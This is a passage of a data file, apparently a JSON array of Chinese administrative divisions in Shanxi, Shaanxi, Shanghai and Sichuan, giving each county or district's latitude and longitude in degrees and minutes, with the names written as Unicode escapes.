"\u6C81\u6E90\u53BF", "36", "30", "112", "20"], ["\u5C71\u897F\u7701", "\u7075\u77F3\u53BF", "36", "51", "111", "46"], ["\u5C71\u897F\u7701", "\u5E73\u9065\u53BF", "37", "11", "112", "10"], ["\u5C71\u897F\u7701", "\u6C81\u53BF", "36", "45", "112", "42"], ["\u5C71\u897F\u7701", "\u7941\u53BF", "37", "21", "112", "20"], ["\u5C71\u897F\u7701", "\u6986\u793E\u53BF", "37", "4", "112", "58"], ["\u5C71\u897F\u7701", "\u6B66\u4E61\u53BF", "36", "50", "112", "51"], ["\u5C71\u897F\u7701", "\u8944\u57A3\u53BF", "36", "32", "113", "3"], ["\u5C71\u897F\u7701", "\u5C6F\u7559\u53BF", "36", "19", "112", "53"], ["\u5C71\u897F\u7701", "\u957F\u6CBB\u53BF", "36", "3", "113", "2"], ["\u5C71\u897F\u7701", "\u6CFD\u5DDE\u53BF", "35", "30", "112", "50"], ["\u5C71\u897F\u7701", "\u9633\u57CE\u53BF", "35", "29", "112", "25"], ["\u5C71\u897F\u7701", "\u957F\u5B50\u53BF", "36", "7", "112", "52"], ["\u5C71\u897F\u7701", "\u6C81\u6C34\u53BF", "35", "41", "112", "11"], ["\u5C71\u897F\u7701", "\u6D6E\u5C71\u53BF", "35", "58", "111", "50"], ["\u5C71\u897F\u7701", "\u7FFC\u57CE\u53BF", "35", "44", "111", "43"], ["\u5C71\u897F\u7701", "\u57A3\u66F2\u53BF", "35", "18", "111", "40"], ["\u5C71\u897F\u7701", "\u9675\u5DDD\u53BF", "35", "47", "113", "16"], ["\u5C71\u897F\u7701", "\u5E73\u987A\u53BF", "36", "12", "113", "26"], ["\u5C71\u897F\u7701", "\u58F6\u5173\u53BF", "36", "7", "113", "12"], ["\u5C71\u897F\u7701", "\u9ECE\u57CE\u53BF", "36", "30", "113", "23"], ["\u5C71\u897F\u7701", "\u548C\u987A\u53BF", "37", "20", "113", "34"], ["\u5C71\u897F\u7701", "\u5DE6\u6743\u53BF", "37", "4", "113", "22"], ["\u5C71\u897F\u7701", "\u5E73\u5B9A\u53BF", "37", "48", "113", "37"], ["\u5C71\u897F\u7701", "\u6614\u9633\u53BF", "37", "37", "113", "42"], ["\u5C71\u897F\u7701", "\u5BFF\u9633\u53BF", "37", "53", "113", "11"], ["\u5C71\u897F\u7701", "\u4E94\u53F0\u53BF", "38", "44", "113", "15"], ["\u5C71\u897F\u7701", "\u76C2\u53BF", "38", "5", "113", "24"], ["\u5C71\u897F\u7701", "\u5E7F\u7075\u53BF", "39", "46", "114", "17"], ["\u5C71\u897F\u7701", "\u6D51\u6E90\u53BF", "39", "42", "113", "41"], ["\u5C71\u897F\u7701", "\u7075\u4E18\u53BF", "39", "26", "114", "14"], ["\u5C71\u897F\u7701", "\u7E41\u5CD9\u53BF", "39", "11", "113", "15"], ["\u5C71\u897F\u7701", "\u5E94\u53BF", "39", "33", "113", "11"], ["\u5C71\u897F\u7701", "\u6000\u4EC1\u53BF", "39", "50", "113", "5"], ["\u5C71\u897F\u7701", "\u5927\u540C\u53BF", "40", "2", "113", "36"], ["\u5C71\u897F\u7701", "\u5C71\u9634\u53BF", "39", "31", "112", "49"], ["\u5C71\u897F\u7701", "\u5DE6\u4E91\u53BF", "40", "0", "112", "42"], ["\u5C71\u897F\u7701", "\u53F3\u7389\u53BF", "39", "59", "112", "28"], ["\u5C71\u897F\u7701", "\u795E\u6C60\u53BF", "39", "5", "112", "12"], ["\u5C71\u897F\u7701", "\u4E94\u5BE8\u53BF", "38", "54", "111", "51"], ["\u5C71\u897F\u7701", "\u5B81\u6B66\u53BF", "39", "0", "112", "18"], ["\u5C71\u897F\u7701", "\u4EE3\u53BF", "39", "4", "112", "57"], ["\u5C71\u897F\u7701", "\u5B9A\u8944\u53BF", "38", "29", "112", "57"], ["\u5C71\u897F\u7701", "\u592A\u8C37\u53BF", "37", "25", "112", "33"], ["\u5C71\u897F\u7701", "\u9633\u66F2\u53BF", "38", "4", "112", "40"], ["\u5C71\u897F\u7701", "\u6E05\u5F90\u53BF", "37", "36", "112", "21"], ["\u5C71\u897F\u7701", "\u4EA4\u57CE\u53BF", "37", "33", "112", "9"], ["\u5C71\u897F\u7701", "\u6587\u6C34\u53BF", "37", "26", "112", "1"], ["\u5C71\u897F\u7701", "\u5A04\u70E6\u53BF", "38", "4", "111", "47"], ["\u5C71\u897F\u7701", "\u5C9A\u53BF", "38", "17", "111", "40"], ["\u5C71\u897F\u7701", "\u9759\u4E50\u53BF", "38", "22", "111", "56"], ["\u5C71\u897F\u7701", "\u5CA2\u5C9A\u53BF", "38", "42", "111", "34"], ["\u5C71\u897F\u7701", "\u5174\u53BF", "38", "28", "111", "7"], ["\u5C71\u897F\u7701", "\u65B9\u5C71\u53BF", "37", "53", "111", "14"], ["\u5C71\u897F\u7701", "\u4E34\u53BF", "37", "57", "110", "59"], ["\u5C71\u897F\u7701", "\u9633\u9AD8\u53BF", "40", "22", "113", "45"], ["\u5C71\u897F\u7701", "\u5929\u9547\u53BF", "40", "25", "114", "5"], ["\u5C71\u897F\u7701", "\u67F3\u6797\u53BF", "37", "26", "110", "54"], ["\u5C71\u897F\u7701", "\u504F\u5173\u53BF", "39", "26", "111", "30"], ["\u5C71\u897F\u7701", "\u6CB3\u66F2\u53BF", "39", "23", "111", "8"], ["\u9655\u897F\u7701", "\u897F\u5B89\u5E02", "34", "16", "108", "56"], ["\u9655\u897F\u7701", "\u5B9D\u9E21\u5E02", "34", "22", "107", "8"], ["\u9655\u897F\u7701", "\u6C49\u4E2D\u5E02", "33", "4", "107", "1"], ["\u9655\u897F\u7701", "\u5B89\u5EB7\u5E02", "32", "41", "109", "1"], ["\u9655\u897F\u7701", "\u5546\u6D1B\u5E02", "33", "52", "109", "56"], ["\u9655\u897F\u7701", "\u6E2D\u5357\u5E02", "34", "30", "109", "30"], ["\u9655\u897F\u7701", "\u54B8\u9633\u5E02", "34", "20", "108", "42"], ["\u9655\u897F\u7701", "\u94DC\u5DDD\u5E02", "34", "54", "108", "56"], ["\u9655\u897F\u7701", "\u5EF6\u5B89\u5E02", "36", "36", "109", "29"], ["\u9655\u897F\u7701", "\u6986\u6797\u5E02", "38", "17", "109", "44"], ["\u9655\u897F\u7701", "\u9648\u4ED3\u533A", "34", "22", "107", "22"], ["\u9655\u897F\u7701", "\u91D1\u53F0\u533A", "34", "23", "107", "8"], ["\u9655\u897F\u7701", "\u6E2D\u6EE8\u533A", "34", "22", "107", "9"], ["\u9655\u897F\u7701", "\u6C49\u53F0\u533A", "33", "4", "107", "2"], ["\u9655\u897F\u7701", "\u6C49\u6EE8\u533A", "32", "41", "109", "1"], ["\u9655\u897F\u7701", "\u5546\u5DDE\u533A", "33", "52", "109", "56"], ["\u9655\u897F\u7701", "\u960E\u826F\u533A", "34", "39", "109", "14"], ["\u9655\u897F\u7701", "\u672A\u592E\u533A", "34", "17", "108", "56"], ["\u9655\u897F\u7701", "\u83B2\u6E56\u533A", "34", "16", "108", "56"], ["\u9655\u897F\u7701", "\u65B0\u57CE\u533A", "34", "16", "108", "57"], ["\u9655\u897F\u7701", "\u7891\u6797\u533A", "34", "14", "108", "56"], ["\u9655\u897F\u7701", "\u96C1\u5854\u533A", "34", "13", "108", "57"], ["\u9655\u897F\u7701", "\u957F\u5B89\u533A", "34", "10", "108", "56"], ["\u9655\u897F\u7701", "\u705E\u6865\u533A", "34", "16", "109", "4"], ["\u9655\u897F\u7701", "\u4E34\u6F7C\u533A", "34", "22", "109", "13"], ["\u9655\u897F\u7701", "\u79E6\u90FD\u533A", "34", "21", "108", "43"], ["\u9655\u897F\u7701", "\u6E2D\u57CE\u533A", "34", "20", "108", "44"], ["\u9655\u897F\u7701", "\u6768\u51CC\u533A", "34", "17", "108", "4"], ["\u9655\u897F\u7701", "\u5370\u53F0\u533A", "35", "6", "109", "6"], ["\u9655\u897F\u7701", "\u738B\u76CA\u533A", "35", "4", "109", "4"], ["\u9655\u897F\u7701", "\u8000\u5DDE\u533A", "34", "55", "108", "59"], ["\u9655\u897F\u7701", "\u4E34\u6E2D\u533A", "34", "30", "109", "29"], ["\u9655\u897F\u7701", "\u5B9D\u5854\u533A", "36", "36", "109", "29"], ["\u9655\u897F\u7701", "\u6986\u9633\u533A", "38", "17", "109", "45"], ["\u9655\u897F\u7701", "\u5174\u5E73\u5E02", "34", "18", "108", "29"], ["\u9655\u897F\u7701", "\u534E\u9634\u5E02", "34", "34", "110", "5"], ["\u9655\u897F\u7701", "\u97E9\u57CE\u5E02", "35", "29", "110", "26"], ["\u9655\u897F\u7701", "\u52C9\u53BF", "33", "9", "106", "40"], ["\u9655\u897F\u7701", "\u5B81\u5F3A\u53BF", "32", "50", "106", "15"], ["\u9655\u897F\u7701", "\u7565\u9633\u53BF", "33", "20", "106", "9"], ["\u9655\u897F\u7701", "\u51E4\u53BF", "33", "55", "106", "31"], ["\u9655\u897F\u7701", "\u6D0B\u53BF", "33", "13", "107", "33"], ["\u9655\u897F\u7701", "\u7559\u575D\u53BF", "33", "37", "106", "55"], ["\u9655\u897F\u7701", "\u51E4\u7FD4\u53BF", "34", "31", "107", "23"], ["\u9655\u897F\u7701", "\u592A\u767D\u53BF", "34", "4", "107", "19"], ["\u9655\u897F\u7701", "\u7709\u53BF", "34", "17", "107", "45"], ["\u9655\u897F\u7701", "\u6276\u98CE\u53BF", "34", "22", "107", "52"], ["\u9655\u897F\u7701", "\u5C90\u5C71\u53BF", "34", "27", "107", "37"], ["\u9655\u897F\u7701", "\u4E7E\u53BF", "34", "32", "108", "14"], ["\u9655\u897F\u7701", "\u6B66\u529F\u53BF", "34", "16", "108", "12"], ["\u9655\u897F\u7701", "\u5468\u81F3\u53BF", "34", "10", "108", "12"], ["\u9655\u897F\u7701", "\u4F5B\u576A\u53BF", "33", "32", "107", "59"], ["\u9655\u897F\u7701", "\u77F3\u6CC9\u53BF", "33", "3", "108", "15"], ["\u9655\u897F\u7701", "\u9547\u5DF4\u53BF", "32", "32", "107", "54"], ["\u9655\u897F\u7701", "\u897F\u4E61\u53BF", "32", "59", "107", "46"], ["\u9655\u897F\u7701", "\u57CE\u56FA\u53BF", "33", "9", "107", "20"], ["\u9655\u897F\u7701", "\u5357\u90D1\u53BF", "33", "0", "106", "56"], ["\u9655\u897F\u7701", "\u7D2B\u9633\u53BF", "32", "31", "108", "32"], ["\u9655\u897F\u7701", "\u5C9A\u768B\u53BF", "32", "19", "108", "54"], ["\u9655\u897F\u7701", "\u6C49\u9634\u53BF", "32", "54", "108", "30"], ["\u9655\u897F\u7701", "\u65EC\u9633\u53BF", "32", "50", "109", "23"], ["\u9655\u897F\u7701", "\u5E73\u5229\u53BF", "32", "24", "109", "21"], ["\u9655\u897F\u7701", "\u9547\u576A\u53BF", "31", "53", "109", "31"], ["\u9655\u897F\u7701", "\u767D\u6CB3\u53BF", "32", "49", "110", "6"], ["\u9655\u897F\u7701", "\u5C71\u9633\u53BF", "33", "32", "109", "53"], ["\u9655\u897F\u7701", "\u4E39\u51E4\u53BF", "33", "42", "110", "20"], ["\u9655\u897F\u7701", "\u5546\u5357\u53BF", "33", "32", "110", "53"], ["\u9655\u897F\u7701", "\u6F7C\u5173\u53BF", "34", "33", "110", "14"], ["\u9655\u897F\u7701", "\u6D1B\u5357\u53BF", "34", "5", "110", "8"], ["\u9655\u897F\u7701", "\u534E\u53BF", "34", "31", "109", "46"], ["\u9655\u897F\u7701", "\u9AD8\u9675\u53BF", "34", "32", "109", "5"], ["\u9655\u897F\u7701", "\u84DD\u7530\u53BF", "34", "9", "109", "19"], ["\u9655\u897F\u7701", "\u67DE\u6C34\u53BF", "33", "41", "109", "6"], ["\u9655\u897F\u7701", "\u9547\u5B89\u53BF", "33", "26", "109", "9"], ["\u9655\u897F\u7701", "\u5B81\u9655\u53BF", "33", "19", "108", "19"], ["\u9655\u897F\u7701", "\u6237\u53BF", "34", "6", "108", "36"], ["\u9655\u897F\u7701", "\u6CFE\u9633\u53BF", "34", "32", "108", "50"], ["\u9655\u897F\u7701", "\u4E09\u539F\u53BF", "34", "37", "108", "56"], ["\u9655\u897F\u7701", "\u793C\u6CC9\u53BF", "34", "29", "108", "25"], ["\u9655\u897F\u7701", "\u6DF3\u5316\u53BF", "34", "47", "108", "35"], ["\u9655\u897F\u7701", "\u65EC\u9091\u53BF", "35", "7", "108", "20"], ["\u9655\u897F\u7701", "\u9EC4\u9675\u53BF", "35", "35", "109", "15"], ["\u9655\u897F\u7701", "\u5B9C\u541B\u53BF", "35", "24", "109", "7"], ["\u9655\u897F\u7701", "\u6D1B\u5DDD\u53BF", "35", "46", "109", "26"], ["\u9655\u897F\u7701", "\u5BCC\u5E73\u53BF", "34", "45", "109", "11"], ["\u9655\u897F\u7701", "\u5927\u8354\u53BF", "34", "48", "109", "56"], ["\u9655\u897F\u7701", "\u767D\u6C34\u53BF", "35", "11", "109", "35"], ["\u9655\u897F\u7701", "\u84B2\u57CE\u53BF", "34", "57", "109", "35"], ["\u9655\u897F\u7701", "\u5408\u9633\u53BF", "35", "14", "110", "9"], ["\u9655\u897F\u7701", "\u6F84\u57CE\u53BF", "35", "11", "109", "56"], ["\u9655\u897F\u7701", "\u9EC4\u9F99\u53BF", "35", "35", "109", "50"], ["\u9655\u897F\u7701", "\u5EF6\u957F\u53BF", "36", "35", "110", "0"], ["\u9655\u897F\u7701", "\u5B9C\u5DDD\u53BF", "36", "3", "110", "10"], ["\u9655\u897F\u7701", "\u6E05\u6DA7\u53BF", "37", "5", "110", "7"], ["\u9655\u897F\u7701", "\u5EF6\u5DDD\u53BF", "36", "53", "110", "11"], ["\u9655\u897F\u7701", "\u5B50\u957F\u53BF", "37", "8", "109", "40"], ["\u9655\u897F\u7701", "\u5B89\u585E\u53BF", "36", "52", "109", "19"], ["\u9655\u897F\u7701", "\u5BCC\u53BF", "35", "59", "109", "22"], ["\u9655\u897F\u7701", "\u7518\u6CC9\u53BF", "36", "17", "109", "21"], ["\u9655\u897F\u7701", "\u5FD7\u4E39\u53BF", "36", "49", "108", "46"], ["\u9655\u897F\u7701", "\u5434\u8D77\u53BF", "36", "56", "108", "10"], ["\u9655\u897F\u7701", "\u5F6C\u53BF", "35", "2", "108", "5"], ["\u9655\u897F\u7701", "\u6C38\u5BFF\u53BF", "34", "42", "108", "8"], ["\u9655\u897F\u7701", "\u9E9F\u6E38\u53BF", "34", "41", "107", "47"], ["\u9655\u897F\u7701", "\u957F\u6B66\u53BF", "35", "12", "107", "47"], ["\u9655\u897F\u7701", "\u5343\u9633\u53BF", "34", "39", "107", "8"], ["\u9655\u897F\u7701", "\u9647\u53BF", "34", "54", "106", "51"], ["\u9655\u897F\u7701", "\u5B9A\u8FB9\u53BF", "37", "35", "107", "36"], ["\u9655\u897F\u7701", "\u5E9C\u8C37\u53BF", "39", "2", "111", "4"], ["\u9655\u897F\u7701", "\u4FDD\u5FB7\u53BF", "39", "1", "111", "5"], ["\u9655\u897F\u7701", "\u795E\u6728\u53BF", "38", "50", "110", "30"], ["\u9655\u897F\u7701", "\u6A2A\u5C71\u53BF", "37", "57", "109", "17"], ["\u9655\u897F\u7701", "\u9756\u8FB9\u53BF", "37", "36", "108", "48"], ["\u9655\u897F\u7701", "\u5B50\u6D32\u53BF", "37", "37", "110", "2"], ["\u9655\u897F\u7701", "\u7EE5\u5FB7\u53BF", "37", "30", "110", "15"], ["\u9655\u897F\u7701", "\u7C73\u8102\u53BF", "37", "45", "110", "11"], ["\u9655\u897F\u7701", "\u5434\u5821\u53BF", "37", "27", "110", "44"], ["\u9655\u897F\u7701", "\u4F73\u53BF", "38", "1", "110", "29"], ["\u4E0A\u6D77\u5E02", "\u4E0A\u6D77\u5E02", "31", "14", "121", "28"], ["\u4E0A\u6D77\u5E02", "\u91D1\u5C71\u533A", "30", "45", "121", "20"], ["\u4E0A\u6D77\u5E02", "\u5949\u8D24\u533A", "30", "55", "121", "28"], ["\u4E0A\u6D77\u5E02", "\u677E\u6C5F\u533A", "31", "2", "121", "13"], ["\u4E0A\u6D77\u5E02", "\u95F5\u884C\u533A", "31", "7", "121", "23"], ["\u4E0A\u6D77\u5E02", "\u5F90\u6C47\u533A", "31", "11", "121", "26"], ["\u4E0A\u6D77\u5E02", "\u957F\u5B81\u533A", "31", "13", "121", "25"], ["\u4E0A\u6D77\u5E02", "\u95F8\u5317\u533A", "31", "15", "121", "27"], ["\u4E0A\u6D77\u5E02", "\u9EC4\u6D66\u533A", "31", "14", "121", "29"], ["\u4E0A\u6D77\u5E02", "\u5362\u6E7E\u533A", "31", "13", "121", "28"], ["\u4E0A\u6D77\u5E02", "\u9759\u5B89\u533A", "31", "14", "121", "27"], ["\u4E0A\u6D77\u5E02", "\u6D66\u4E1C\u65B0\u533A", "31", "13", "121", "32"], ["\u4E0A\u6D77\u5E02", "\u6768\u6D66\u533A", "31", "16", "121", "31"], ["\u4E0A\u6D77\u5E02", "\u8679\u53E3\u533A", "31", "16", "121", "30"], ["\u4E0A\u6D77\u5E02", "\u666E\u9640\u533A", "31", "15", "121", "24"], ["\u4E0A\u6D77\u5E02", "\u9752\u6D66\u533A", "31", "9", "121", "7"], ["\u4E0A\u6D77\u5E02", "\u5609\u5B9A\u533A", "31", "23", "121", "16"], ["\u4E0A\u6D77\u5E02", "\u5B9D\u5C71\u533A", "31", "24", "121", "29"], ["\u4E0A\u6D77\u5E02", "\u5357\u6C47\u533A", "31", "3", "121", "45"], ["\u4E0A\u6D77\u5E02", "\u5D07\u660E\u53BF", "31", "37", "121", "24"], ["\u56DB\u5DDD\u7701", "\u6210\u90FD\u5E02", "30", "40", "104", "4"], ["\u56DB\u5DDD\u7701", "\u6500\u679D\u82B1\u5E02", "26", "35", "101", "43"], ["\u56DB\u5DDD\u7701", "\u51C9\u5C71\u5F5D\u65CF\u81EA\u6CBB\u5DDE", "27", "54", "102", "16"], ["\u56DB\u5DDD\u7701", "\u7518\u5B5C\u85CF\u65CF\u81EA\u6CBB\u5DDE", "30", "3", "101", "58"], ["\u56DB\u5DDD\u7701", "\u963F\u575D\u85CF\u65CF\u7F8C\u65CF\u81EA\u6CBB\u5DDE", "31", "54", "102", "13"], ["\u56DB\u5DDD\u7701", "\u5E7F\u5143\u5E02", "32", "26", "105", "50"], ["\u56DB\u5DDD\u7701", "\u5DF4\u4E2D\u5E02", "31", "51", "106", "46"], ["\u56DB\u5DDD\u7701", "\u8FBE\u5DDE\u5E02", "31", "13", "107", "30"], ["\u56DB\u5DDD\u7701", "\u5357\u5145\u5E02", "30", "47", "106", "5"], ["\u56DB\u5DDD\u7701", "\u5E7F\u5B89\u5E02", "30", "28", "106", "38"], ["\u56DB\u5DDD\u7701", "\u9042\u5B81\u5E02", "30", "31", "105", "34"], ["\u56DB\u5DDD\u7701", "\u7EF5\u9633\u5E02", "31", "28", "104", "44"], ["\u56DB\u5DDD\u7701", "\u5FB7\u9633\u5E02", "31", "8", "104", "23"], ["\u56DB\u5DDD\u7701", "\u7709\u5C71\u5E02", "30", "3", "103", "50"], ["\u56DB\u5DDD\u7701", "\u96C5\u5B89\u5E02", "29", "59", "102", "60"], ["\u56DB\u5DDD\u7701", "\u4E50\u5C71\u5E02", "29", "34", "103", "46"], ["\u56DB\u5DDD\u7701", "\u81EA\u8D21\u5E02", "29", "21", "104", "47"], ["\u56DB\u5DDD\u7701", "\u5185\u6C5F\u5E02", "29", "35", "105", "3"], ["\u56DB\u5DDD\u7701", "\u8D44\u9633\u5E02", "30", "7", "104", "39"], ["\u56DB\u5DDD\u7701", "\u6CF8\u5DDE\u5E02", "28", "52", "105", "26"], ["\u56DB\u5DDD\u7701", "\u5B9C\u5BBE\u5E02", "28", "46", "104", "37"], ["\u56DB\u5DDD\u7701", "\u96C1\u6C5F\u533A", "30", "7", "104", "39"], ["\u56DB\u5DDD\u7701", "\u5E02\u4E2D\u533A", "29", "35", "105", "3"], ["\u56DB\u5DDD\u7701", "\u4E1C\u5174\u533A", "29", "36", "105", "4"], ["\u56DB\u5DDD\u7701", "\u8D21\u4E95\u533A", "29", "21", "104", "43"], ["\u56DB\u5DDD\u7701", "\u81EA\u6D41\u4E95\u533A", "29", "21", "104", "46"], ["\u56DB\u5DDD\u7701", "\u5927\u5B89\u533A", "29", "22", "104", "46"], ["\u56DB\u5DDD\u7701", "\u6CBF\u6EE9\u533A", "29", "16", "104", "52"], ["\u56DB\u5DDD\u7701", "\u7EB3\u6EAA\u533A", "28", "46", "105", "22"], ["\u56DB\u5DDD\u7701", "\u9F99\u9A6C\u6F6D\u533A", "28", "54", "105", "26"], ["\u56DB\u5DDD\u7701", "\u6C5F\u9633\u533A", "28", "53", "105", "27"], ["\u56DB\u5DDD\u7701", "\u7FE0\u5C4F\u533A", "28", "46", "104", "37"], ["\u56DB\u5DDD\u7701", "\u6C99\u6E7E\u533A", "29", "25", "103", "33"], ["\u56DB\u5DDD\u7701", "\u4E94\u901A\u6865\u533A", "29", "24", "103", "49"], ["\u56DB\u5DDD\u7701", "\u5E02\u4E2D\u533A", "29", "34", "103", "46"], ["\u56DB\u5DDD\u7701", "\u91D1\u53E3\u6CB3\u533A", "29", "15", "103", "5"], ["\u56DB\u5DDD\u7701", "\u4E1C\u5761\u533A", "30", "3", "103", "50"], ["\u56DB\u5DDD\u7701", "\u96E8\u57CE\u533A", "29", "59", "102", "60"], ["\u56DB\u5DDD\u7701", "\u9752\u767D\u6C5F\u533A", "30", "53", "104", "14"], ["\u56DB\u5DDD\u7701", "\u65B0\u90FD\u533A", "30", "50", "104", "9"], ["\u56DB\u5DDD\u7701", "\u9F99\u6CC9\u9A7F\u533A", "30", "34", "104", "16"], ["\u56DB\u5DDD\u7701", "\u6210\u534E\u533A", "30", "40", "104", "6"], ["\u56DB\u5DDD\u7701", "\u9526\u6C5F\u533A", "30", "40", "104", "5"], ["\u56DB\u5DDD\u7701", "\u91D1\u725B\u533A", "30", "42", "104", "3"], ["\u56DB\u5DDD\u7701", "\u9752\u7F8A\u533A", "30", "41", "104", "3"], ["\u56DB\u5DDD\u7701", "\u6B66\u4FAF\u533A", "30", "39", "104", "3"], ["\u56DB\u5DDD\u7701", "\u6E29\u6C5F\u533A", "30", "42", "103", "50"], ["\u56DB\u5DDD\u7701", "\u65CC\u9633\u533A", "31", "8", "104", "23"], ["\u56DB\u5DDD\u7701", "\u8239\u5C71\u533A", "30", "31", "105", "34"], ["\u56DB\u5DDD\u7701", "\u5B89\u5C45\u533A", "30", "21", "105", "27"], ["\u56DB\u5DDD\u7701", "\u5DF4\u5DDE\u533A", "31", "51", "106", "46"], ["\u56DB\u5DDD\u7701", "\u901A\u5DDD\u533A", "31", "13", "107", "29"], ["\u56DB\u5DDD\u7701", "\u5609\u9675\u533A", "30", "46", "106", "3"], ["\u56DB\u5DDD\u7701", "\u9AD8\u576A\u533A", "30", "46", "106", "6"], ["\u56DB\u5DDD\u7701", "\u987A\u5E86\u533A", "30", "47", "106", "5"], ["\u56DB\u5DDD\u7701", "\u671D\u5929\u533A", "32", "39", "105", "53"], ["\u56DB\u5DDD\u7701", "\u5229\u5DDE\u533A", "32", "26", "105", "50"], ["\u56DB\u5DDD\u7701", "\u5143\u575D\u533A", "32", "19", "105", "58"], ["\u56DB\u5DDD\u7701", "\u6E38\u4ED9\u533A", "31", "28", "104", "45"], ["\u56DB\u5DDD\u7701", "\u6DAA\u57CE\u533A", "31", "28", "104", "44"], ["\u56DB\u5DDD\u7701", "\u897F\u533A", "26", "36", "101", "36"], ["\u56DB\u5DDD\u7701", "\u4EC1\u548C\u533A", "26", "30", "101", "44"], ["\u56DB\u5DDD\u7701", "\u4E1C\u533A", "26", "33", "101", "42"], ["\u56DB\u5DDD\u7701", "\u897F\u660C\u5E02", "27", "54", "102", "16"], ["\u56DB\u5DDD\u7701", "\u6C5F\u6CB9\u5E02", "31", "47", "104", "45"], ["\u56DB\u5DDD\u7701", "\u4E07\u6E90\u5E02", "32", "4", "108", "2"], ["\u56DB\u5DDD\u7701", "\u534E\u84E5\u5E02", "30", "23", "106", "46"], ["\u56DB\u5DDD\u7701", "\u9606\u4E2D\u5E02", "31", "33", "105", "60"], ["\u56DB\u5DDD\u7701", "\u7B80\u9633\u5E02", "30", "24", "104", "33"], ["\u56DB\u5DDD\u7701", "\u7EF5\u7AF9\u5E02", "31", "21", "104", "12"], ["\u56DB\u5DDD\u7701", "\u4EC0\u90A1\u5E02", "31", "8", "104", "10"], ["\u56DB\u5DDD\u7701", "\u90FD\u6C5F\u5830\u5E02", "31", "0", "103", "37"], ["\u56DB\u5DDD\u7701", "\u909B\u5D03\u5E02", "30", "25", "103", "28"], ["\u56DB\u5DDD\u7701", "\u5D07\u5DDE\u5E02", "30", "38", "103", "40"], ["\u56DB\u5DDD\u7701", "\u5F6D\u5DDE\u5E02", "30", "59", "103", "56"], ["\u56DB\u5DDD\u7701", "\u5E7F\u6C49\u5E02", "30", "59", "104", "17"], ["\u56DB\u5DDD\u7701", "\u5CE8\u7709\u5C71\u5E02", "29", "36", "103", "29"], ["\u56DB\u5DDD\u7701", "\u5C4F\u5C71\u53BF", "28", "50", "104", "20"], ["\u56DB\u5DDD\u7701", "\u9752\u5DDD\u53BF", "32", "35", "105", "14"], ["\u56DB\u5DDD\u7701", "\u5F97\u8363\u53BF", "28", "43", "99", "17"], ["\u56DB\u5DDD\u7701", "\u76D0\u6E90\u53BF", "27", "26", "101", "30"], ["\u56DB\u5DDD\u7701", "\u76D0\u8FB9\u53BF", "26", "42", "101", "51"], ["\u56DB\u5DDD\u7701", "\u4F1A\u7406\u53BF", "26", "40", "102", "15"], ["\u56DB\u5DDD\u7701", "\u4F1A\u4E1C\u53BF", "26", "38", "102", "35"], ["\u56DB\u5DDD\u7701", "\u5B81\u5357\u53BF", "27", "4", "102", "46"], ["\u56DB\u5DDD\u7701", "\u666E\u683C\u53BF", "27", "23", "102", "32"], ["\u56DB\u5DDD\u7701", "\u5FB7\u660C\u53BF", "27", "24", "102", "11"], ["\u56DB\u5DDD\u7701", "\u7C73\u6613\u53BF", "26", "53", "102", "7"], ["\u56DB\u5DDD\u7701", "\u5E03\u62D6\u53BF", "27", "43", "102", "49"], ["\u56DB\u5DDD\u7701", "\u662D\u89C9\u53BF", "28", "1", "102", "51"], ["\u56DB\u5DDD\u7701", "\u559C\u5FB7\u53BF", "28", "19", "102", "25"], ["\u56DB\u5DDD\u7701", "\u8D8A\u897F\u53BF", "28", "39", "102", "31"], ["\u56DB\u5DDD\u7701", "\u5195\u5B81\u53BF", "28", "33", "102", "10"], ["\u56DB\u5DDD\u7701", "\u4E5D\u9F99\u53BF", "29", "0", "101", "30"], ["\u56DB\u5DDD\u7701", "\u6728\u91CC\u85CF\u65CF\u81EA\u6CBB\u53BF", "27", "56", "101", "17"], ["\u56DB\u5DDD\u7701", "\u7A3B\u57CE\u53BF", "29", "2", "100", "18"], ["\u56DB\u5DDD\u7701", "\u7406\u5858\u53BF", "29", "60", "100", "16"], ["\u56DB\u5DDD\u7701", "\u96C5\u6C5F\u53BF", "30", "2", "101", "1"], ["\u56DB\u5DDD\u7701", "\u5EB7\u5B9A\u53BF", "30", "3", "101", "58"], ["\u56DB\u5DDD\u7701", "\u77F3\u68C9\u53BF", "29", "14", "102", "22"], ["\u56DB\u5DDD\u7701", "\u7518\u6D1B\u53BF", "28", "58", "102", "46"], ["\u56DB\u5DDD\u7701", "\u6C49\u6E90\u53BF", "29", "21", "102", "39"], ["\u56DB\u5DDD\u7701", "\u5929\u5168\u53BF", "30", "4", "102", "45"], ["\u56DB\u5DDD\u7701", "\u8365\u7ECF\u53BF", "29", "48", "102", "51"], ["\u56DB\u5DDD\u7701", "\u82A6\u5C71\u53BF", "30", "9", "102", "55"], ["\u56DB\u5DDD\u7701", "\u6CF8\u5B9A\u53BF", "29", "55", "102", "14"], ["\u56DB\u5DDD\u7701", "\u4E39\u5DF4\u53BF", "30", "53", "101", "53"], ["\u56DB\u5DDD\u7701", "\u5C0F\u91D1\u53BF", "31", "0", "102", "22"], ["\u56DB\u5DDD\u7701", "\u5B9D\u5174\u53BF", "30", "22", "102", "49"], ["\u56DB\u5DDD\u7701", "\u91D1\u5DDD\u53BF", "31", "29", "102", "4"], ["\u56DB\u5DDD\u7701", "\u9053\u5B5A\u53BF", "30", "59", "101", "7"], ["\u56DB\u5DDD\u7701", "\u65B0\u9F99\u53BF", "30", "57", "100", "19"], ["\u56DB\u5DDD\u7701", "\u7089\u970D\u53BF", "31", "24", "100", "41"], ["\u56DB\u5DDD\u7701", "\u7518\u5B5C\u53BF", "31", "37", "99", "59"], ["\u56DB\u5DDD\u7701", "\u5FB7\u683C\u53BF", "31", "49", "98", "35"], ["\u56DB\u5DDD\u7701", "\u767D\u7389\u53BF", "31", "13", "98", "50"], ["\u56DB\u5DDD\u7701", "\u5DF4\u5858\u53BF", "30", "0", "99", "6"], ["\u56DB\u5DDD\u7701", "\u4E61\u57CE\u53BF", "28", "56", "99", "48"], ["\u56DB\u5DDD\u7701", "\u77F3\u6E20\u53BF", "32", "59", "98", "6"], ["\u56DB\u5DDD\u7701", "\u82E5\u5C14\u76D6\u53BF", "33", "35", "102", "57"], ["\u56DB\u5DDD\u7701", "\u963F\u575D\u53BF", "32", "54", "101", "42"], ["\u56DB\u5DDD\u7701", "\u8272\u8FBE\u53BF", "32", "16", "100", "20"], ["\u56DB\u5DDD\u7701", "\u58E4\u5858\u53BF", "32", "16", "100", "59"], ["\u56DB\u5DDD\u7701", "\u7EA2\u539F\u53BF", "32", "48", "102", "33"], ["\u56DB\u5DDD\u7701", "\u9A6C\u5C14\u5EB7\u53BF", "31", "54", "102", "13"], ["\u56DB\u5DDD\u7701", "\u9ED1\u6C34\u53BF", "32", 